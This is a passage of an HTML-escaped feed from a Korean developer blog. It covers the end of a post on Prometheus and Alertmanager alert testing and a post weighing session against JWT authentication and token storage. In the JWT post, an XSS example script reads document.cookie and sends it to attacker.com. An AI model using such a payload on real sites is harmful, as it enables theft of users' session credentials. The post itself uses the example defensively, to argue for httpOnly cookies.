&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;확인
    &lt;ul&gt;
      &lt;li&gt;스프링, 프로메테우스, 얼럿매니저 도커 컨테이너를 실행한다.&lt;/li&gt;
      &lt;li&gt;프로메테우스 알람 룰이 잘 등록되었는지 확인
        &lt;ul&gt;
          &lt;li&gt;브라우저를 켜고 http://localhost:9090/alerts로 접속&lt;/li&gt;
          &lt;li&gt;alert_rules.yml에 등록한 알람이 잘 등록되었는지 확인&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;얼럿매니저 잘 동작하는지 확인
        &lt;ul&gt;
          &lt;li&gt;브라우저를 켜고 http://localhost:9093 접속&lt;/li&gt;
          &lt;li&gt;정상 접속되면 성공&lt;/li&gt;
          &lt;li&gt;알람이 발송되면 slack과 얼럿매니저에서 기록되어야 함&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;알람 일부러 일으켜 보기
    &lt;ul&gt;
      &lt;li&gt;alert_rules.yml
        &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;      
&lt;span class=&quot;na&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;CPU&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;HighCPUUsage&lt;/span&gt;  
&lt;span class=&quot;c1&quot;&gt;#        expr: (sum(rate(node_cpu_seconds_total{mode!=&quot;idle&quot;}[5m])) by (instance)) &amp;gt; 0.7  &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#        for: 30s  &lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;expr&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(sum(rate(node_cpu_seconds_total{mode!=&quot;idle&quot;}[5m])) by (instance)) &amp;gt; 0.00001&lt;/span&gt;  
        &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1s&lt;/span&gt;  
        &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;severity&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;critical&lt;/span&gt;  
        &lt;span class=&quot;na&quot;&gt;annotations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;summary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CPU&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;사용량&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;70%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;초과&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;지속&quot;&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$labels.instance&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;has&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CPU&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;usage.&quot;&lt;/span&gt;
        
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;위 설정을 적용하고 일정 시간 기다림&lt;/li&gt;
      &lt;li&gt;이후 slack이나 얼럿매니저를 확인하면 알람 확인 가능&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;예시-github-repository&quot;&gt;예시 github repository&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/a3magic3pocket/monitoring-sandbox&quot; target=&quot;_blank&quot;&gt;monitoring-sandbox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;참고&quot;&gt;참고&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://help.ovice.com/hc/ko/articles/16515667939737--Webhook-%EC%84%A4%EC%A0%95-Slack%EC%97%90%EC%84%9C-%EC%95%8C%EB%A6%BC-%EB%B0%9B%EA%B8%B0&quot; target=&quot;_blank&quot;&gt;슬랙 웹훅 생성&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Monitoring" /><category term="prometheus" /><category term="grafana" /><category term="alertmanager" /><category term="essay" /><summary type="html">정의 시스템 상태와 성능을 지속적으로 관찰하고 분석하는 과정 이를 통해 문제를 조기에 발견하는 것을 목표로 한다.</summary></entry><entry><title type="html">인증방식 고민</title><link href="https://a3magic3pocket.github.io/posts/exploring-authentication-options/" rel="alternate" type="text/html" title="인증방식 고민" /><published>2025-04-06T08:49:12+09:00</published><updated>2025-04-11T22:27:26+09:00</updated><id>https://a3magic3pocket.github.io/posts/exploring-authentication-options</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/exploring-authentication-options/">&lt;h2 id=&quot;세션-인증-방식과-jwt-인증-방식의-차이&quot;&gt;세션 인증 방식과 JWT 인증 방식의 차이&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;세션 방식
    &lt;ul&gt;
      &lt;li&gt;서버에서 사용자 정보를 key-value 저장소에 저장&lt;/li&gt;
      &lt;li&gt;서버에서 key를 사용자 쿠키에 담아서 전송&lt;/li&gt;
      &lt;li&gt;사용자가 인증이 필요한 요청을 하면&lt;br /&gt;
요청과 함께 키가 담긴 쿠키가 서버로 전송됨&lt;/li&gt;
      &lt;li&gt;서버는 key를 가지고 key-value 저장소를 조회하여&lt;br /&gt;
인증정보가 유효함을 확인함&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;세션 방식의 문제
    &lt;ul&gt;
      &lt;li&gt;인증 정보가 key-value 저장소에 저장되기 때문에&lt;br /&gt;
인증 요청이 많아질수록 key-value 저장소에 저장되는&lt;br /&gt;
인증 정보량도 증가함&lt;/li&gt;
      &lt;li&gt;인증이 필요한 요청마다 key-value 저장소를 조회하기 때문에&lt;br /&gt;
인증 정보가 너무 많이 저장된 경우 조회 성능도 줄어든다.&lt;/li&gt;
      &lt;li&gt;한 명의 유저가 여러 디바이스를 가지고 다중 접속하는 경우도&lt;br /&gt;
많아지기에 key-value 저장소가 성능 문제를 일으킬수도 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;JWT(Json Web Token)
    &lt;ul&gt;
      &lt;li&gt;인증정보를 key-value 저장소에 저장하는게 아니라&lt;br /&gt;
사용자 고유키를 포함한 몇 가지 정보를&lt;br /&gt;
쿠키에 담거나, 응답으로 준 뒤 헤더(Authorization) 받는 방법이다.&lt;/li&gt;
      &lt;li&gt;이때 클라이언트에서 임의로 사용자 고유키를 변경하는 것을 &lt;br /&gt;
막기 위해 전자서명을 담아서 위조를 방지한다.&lt;/li&gt;
      &lt;li&gt;전자서명(Signature) 생성
        &lt;ul&gt;
          &lt;li&gt;Header + Payload를 Base64Url 인코딩&lt;/li&gt;
          &lt;li&gt;Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 생성&lt;/li&gt;
          &lt;li&gt;비밀키(Private Key)로 해시 값을 암호화하여 Signature 생성&lt;/li&gt;
          &lt;li&gt;Header.Payload.Signature 형태의 JWT 응답&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전자서명 검증
        &lt;ul&gt;
          &lt;li&gt;JWT에서 Header, Payload, Signature 분리&lt;/li&gt;
          &lt;li&gt;Header + Payload를 Base64Url 인코딩 &lt;br /&gt;
(클라이언트가 보낸 값 그대로 사용)&lt;/li&gt;
          &lt;li&gt;Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 계산&lt;/li&gt;
          &lt;li&gt;공개키(Public Key)로 Signature를 검증
            &lt;ul&gt;
              &lt;li&gt;Signature를 공개키로 복호화&lt;/li&gt;
              &lt;li&gt;복호화된 값(원래 해시)과 직접 계산한 해시 값 비교&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;일치하면 유효한 토큰, 다르면 위조된 토큰&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;JWT 운영
    &lt;ul&gt;
      &lt;li&gt;Access 토큰
        &lt;ul&gt;
          &lt;li&gt;사용자 고유키를 포함한 몇 가지 정보가 담긴 토큰&lt;/li&gt;
          &lt;li&gt;인증 여부를 판별할때 사용하기에&lt;br /&gt;
유효기간을 짧게 두어 &lt;br /&gt;
토큰이 탈취되었을 때 위험을 최소화한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Refresh 토큰
        &lt;ul&gt;
          &lt;li&gt;Access 토큰을 재발행할 때 사용하는 토큰이다.&lt;/li&gt;
          &lt;li&gt;Refresh 토큰이 유효하다면 Refresh 토큰을 이용하여&lt;br /&gt;
Access 토큰을 재발행한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;JWT 인증이 세션 방식보다 좋은 점
    &lt;ul&gt;
      &lt;li&gt;key-value 저장소를 운영하지 않을 수 있다.
        &lt;ul&gt;
          &lt;li&gt;이미 사용자 정보가 Access 토큰에 포함되어 있기 때문에&lt;br /&gt;
key-value 저장소를 운영할 필요가 없다.&lt;/li&gt;
          &lt;li&gt;다만 Refresh 토큰 탈취를 대비하여&lt;br /&gt;
블랙리스트 제도를 도입한다면 key-value 저장소를 운영해야한다.&lt;br /&gt;
하지만 이때에도 블랙리스트로 등록된 refresh 토큰만 조회하므로&lt;br /&gt;
세션 key-value 스토어보다 저장되는 데이터는 적다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;DB 조회 최소화
        &lt;ul&gt;
          &lt;li&gt;극단적으로 사용자 고유키 외에 인증에 필요한 다양한 정보&lt;br /&gt;
(이름, 닉네임, 생년월일) 등을 JWT에 저장하면&lt;br /&gt;
DB 조회 수를 줄일 수 있다.&lt;/li&gt;
          &lt;li&gt;다만 많은 정보를 저장할수록 JWT 길이가 길어져서&lt;br /&gt;
인증이 필요한 요청을 할때마다 주고 받는 데이터 양이 증가한다.&lt;/li&gt;
          &lt;li&gt;JWT payload는 JWT 토큰 탈취 시에 그대로 노출되기 때문에&lt;br /&gt;
생년월일 등의 민감정보는 저장하지 않는 것이 좋다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그래서 어떤 방법을 선택?
    &lt;ul&gt;
      &lt;li&gt;현재 팀은 JWT 인증 방식 경험이 더 많으므로&lt;br /&gt;
JWT 인증 방식 선택&lt;/li&gt;
      &lt;li&gt;JWT payload에는 사용자 고유키만 포함&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;jwt를-어디에-저장할까&quot;&gt;JWT를 어디에 저장할까?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;웹에서 인증정보를 저장하는 것에 어려움
    &lt;ul&gt;
      &lt;li&gt;웹 브라우저에서 javascript로 접근 가능한 저장소는 XSS 공격을 받을 수 있다.&lt;/li&gt;
      &lt;li&gt;XSS(Cross-Site-Scripting)
        &lt;ul&gt;
          &lt;li&gt;악의적인 스크립트 코드를 다른 사용자의 브라우저에서 실행시키는 공격&lt;/li&gt;
          &lt;li&gt;일반적인 브라우저에서는 동일 출처 정잭(Same origin policy)를 &lt;br /&gt;
갖기 때문에 이메일 등을 이용한 우회적인 방법으로는 &lt;br /&gt;
XSS 공격을 실행시키기 어렵다.&lt;/li&gt;
          &lt;li&gt;다만 사이트 내에 사용자가 입력할 수 있는 정보가 있고&lt;br /&gt;
script 예외처리가 제대로 처리되지 않은 경우에는&lt;br /&gt;
XSS 공격을 실행시킬 수 있다.&lt;/li&gt;
          &lt;li&gt;XSS 공격의 핵심은 javascript로 접근 가능한 &lt;br /&gt;
쿠키나 로컬스토리지에 담긴 인증 정보를 &lt;br /&gt;
공격자가 악의적 스크립트를 삽입하여 탈취하는 것이다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;XSS 예시
        &lt;ul&gt;
          &lt;li&gt;시나리오
            &lt;ul&gt;
              &lt;li&gt;공격자는 이메일로 사용의 helloworld.com 인증정보를 &lt;br /&gt;
탈취하고자 한다.&lt;/li&gt;
              &lt;li&gt;helloworld.com은 인증정보를 httpOnly = false로 쿠키에 저장한다.&lt;/li&gt;
              &lt;li&gt;사용자는 구형 브라우저로 사용 중이라 samesite = none이 기본값이다.&lt;/li&gt;
              &lt;li&gt;이메일 제공자는 어떠한 스크립트 방어 정책도 제공하지 않는다.&lt;/li&gt;
              &lt;li&gt;사용자는 helloworld.com에 최근 로그인한 상태라 브라우저에서&lt;br /&gt;
인증정보를 가지고 있다.&lt;/li&gt;
              &lt;li&gt;공격자 사이트로 해당 쿠기가 담겨 전송된다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;이메일 악성 스크립트 예시
            &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;  
	&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://attacker.com/steal-cookies&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
		&lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
		&lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
			&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;application/json&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;  
		&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;  
		&lt;span class=&quot;na&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;  
			&lt;span class=&quot;na&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//사용자의 쿠키 정보 추출  &lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;  
	&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;  
	&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;쿠키 전송 완료&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  
	&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;에러 발생&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;웹 브라우저에서 인증 정보를 저장할 수 있는 장소
    &lt;ul&gt;
      &lt;li&gt;로컬 스토리지
        &lt;ul&gt;
          &lt;li&gt;Javascript로 로컬 스토리지 조회가 가능하기 때문에 XSS 공격에 취약하다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;쿠키(httpOnly = false)
        &lt;ul&gt;
          &lt;li&gt;Javascript로 조회가 쿠키(httpOnly = false )가능하기 때문에 &lt;br /&gt;
XSS 공격에 취약하다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;메모리 저장소
        &lt;ul&gt;
          &lt;li&gt;Redux, Recoil, Zustand와 같이 전역 state 저장소를 사용할 수도 있다.&lt;/li&gt;
          &lt;li&gt;XSS로 메모리 영역 변수 조회를 하기는 어렵다.&lt;/li&gt;
          &lt;li&gt;하지만 새로 고침 시 초기화 되므로 계속 사용하기 어렵다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;쿠키(httpOnly = true)
        &lt;ul&gt;
          &lt;li&gt;웹 브라우저 javascript 로는 httpOnly = true 쿠키를 조회할 수 없다.&lt;/li&gt;
          &lt;li&gt;samesite = lax로 설정하면 브라우저가 다른 도메인으로 요청한 경&lt;br /&gt;
httpOnly = true가 함께 전달되지 않는다.&lt;/li&gt;
          &lt;li&gt;웹 브라우저에서는 해당 쿠키를 아예 조회할 수 없기 때문에&lt;br /&gt;
쿠키 관련된 처리는 모두 서버에서 처리한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그래서 어디에 저장?
    &lt;ul&gt;
      &lt;li&gt;쿠키(httpOnly = true)에 저장한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;클라이언트에게-현재-인증-여부를-알리는-방법&quot;&gt;클라이언트에게 현재 인증 여부를 알리는 방법&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;서버에서 쿠키(httpOnly = true)로 인증정보를 저장하면&lt;br /&gt;
클라이언트에서는 인증정보를 아예 볼 수 없기 때문에&lt;br /&gt;
현재 인증 여부를 알 수 없다.&lt;/li&gt;
  &lt;li&gt;방법1 - 직접 인증이 필요한 요청을 날려서 확인하기
    &lt;ul&gt;
      &lt;li&gt;메인페이지의 [로그인/로그아웃] 버튼과 같이&lt;br /&gt;
인증 없이 들어갈 수 있는 페이지에서&lt;br /&gt;
인증 여부에 따라 다르게 표시해야하는 경우가 있다.&lt;/li&gt;
      &lt;li&gt;사용자가 메인페이지에 접속할때마다&lt;br /&gt;
인증이 필요한 요청을 먼저 날려서 &lt;br /&gt;
인증 유무를 파악해야한다.&lt;/li&gt;
      &lt;li&gt;불필요한 요청으로 인하여 트래픽이 증가하고&lt;br /&gt;
접속마다 상태를 확인하기 때문에&lt;br /&gt;
빈번한 렌더링으로 사용자 경험이 안 좋아진다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;방법2 -서버에서 JWT 응답 본문에 인증 만료 시간 포함
    &lt;ul&gt;
      &lt;li&gt;JWT 발급 시 본문에 인증 만료 시간을 포함시켜&lt;br /&gt;
클라이언트에서 인증이 언제 만료되는지 알 수 있게 한다.&lt;/li&gt;
      &lt;li&gt;방법1의 단점을 모두 보완할 수 있지만&lt;br /&gt;
클라이언트에서 만료 시간을 확인하고&lt;br /&gt;
요청 전에 만료시간과 비교해서&lt;br /&gt;
인증 유효여부를 판별해야한다는 불편함이 있다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;방법3 - 서버에서 인증 쿠키와 동일한 생명주기를 가진 &lt;br /&gt;
더미 힌트 쿠키를 응답에 포함
    &lt;ul&gt;
      &lt;li&gt;더미 힌트 쿠키는 httpOnly = false이기 때문에&lt;br /&gt;
클라이언트에서 조회할 수 있다.&lt;/li&gt;
      &lt;li&gt;더미 힌트 쿠키는 인증 쿠키와 생명주기가 같기 때문에&lt;br /&gt;
인증쿠키가 만료되면 더미 힌트 쿠키도 만료되어&lt;br /&gt;
없어지게 된다.&lt;/li&gt;
      &lt;li&gt;따라서 클라이언트에서는 더미 힌트 쿠키 조회하여&lt;br /&gt;
존재 유무에 따라 인증여부를 판단한다.&lt;/li&gt;
      &lt;li&gt;더미 힌트 쿠키는 매 요청마다 함께 전송되기 떄문에 &lt;br /&gt;
body를 비우거나 아주 작은 값만 넣어 데이터를 최소화한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그래서 어떤 방법 선택?
    &lt;ul&gt;
      &lt;li&gt;더미 힌트 쿠키로 구현해보자.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;refresh-토큰에-사용자-식별자를-포함시켜야할까&quot;&gt;Refresh 토큰에 사용자 식별자를 포함시켜야할까?&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;포함시킨다.
    &lt;ul&gt;
      &lt;li&gt;장점
        &lt;ul&gt;
          &lt;li&gt;DB 조회 없이 Refresh 토큰만으로 Access 토큰은 발급할 수 있다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;단점
        &lt;ul&gt;
          &lt;li&gt;Refresh 토큰 탈취 시 사용자 식별자도 함께 탈취된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;포함시키지 않는다.
    &lt;ul&gt;
      &lt;li&gt;설명
        &lt;ul&gt;
          &lt;li&gt;key-value 저장소에 key: UUID, value: 사용자 식별자를 저장한다.&lt;/li&gt;
          &lt;li&gt;Refresh 토큰에는 UUID만 담는다.&lt;/li&gt;
          &lt;li&gt;Refresh 토큰으로 Access 토큰 생성 시 UUID를 이용하여 &lt;br /&gt;
사용자 식별자를 찾아 Access 토큰을 발급한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;장점
        &lt;ul&gt;
          &lt;li&gt;Refresh 토큰이 탈취되어도 사용자 식별자는 탈취되지 않는다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;단점
        &lt;ul&gt;
          &lt;li&gt;Access 토큰이 만료될 때마다 key-value 저장소를 조회한다.&lt;/li&gt;
          &lt;li&gt;이 경우에도 세션보다는 key-value 저장소 조회 빈도는 적다.&lt;/li&gt;
          &lt;li&gt;세션은 매 요청마다 key-value 저장소를 조회해야 하지만&lt;br /&gt;
Refresh UUID 에서는 Access 토큰 만료 후 요청 시에만 &lt;br /&gt;
key-value 저장소를 조회한다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;암호화하여 포함시킨다.
    &lt;ul&gt;
      &lt;li&gt;장점
        &lt;ul&gt;
          &lt;li&gt;DB 조회 없이 Refresh 토큰만으로 Access 토큰을 발급할 수 있다.&lt;/li&gt;
          &lt;li&gt;Refresh 토큰이 탈취되어도 사용자 식별자를 판별할 수 없다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;단점
        &lt;ul&gt;
          &lt;li&gt;암복호화 시간이 추가된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그래서 어떤 방법 선택?
    &lt;ul&gt;
      &lt;li&gt;현재는 Refresh 토큰에 사용자 식별자를 포함하는 것으로 구현되어 있다.&lt;/li&gt;
      &lt;li&gt;추후에 암호화하여 포함시키는 것을 검토하고 &lt;br /&gt;
문제 없으면 교체해보자.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;구체적인-구현-방법&quot;&gt;구체적인 구현 방법&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;가정
    &lt;ul&gt;
      &lt;li&gt;JWT 방식으로 인증을 구현한다.&lt;/li&gt;
      &lt;li&gt;Access 토큰과 Refresh 토큰을 사용하여 인증을 처리한다.&lt;/li&gt;
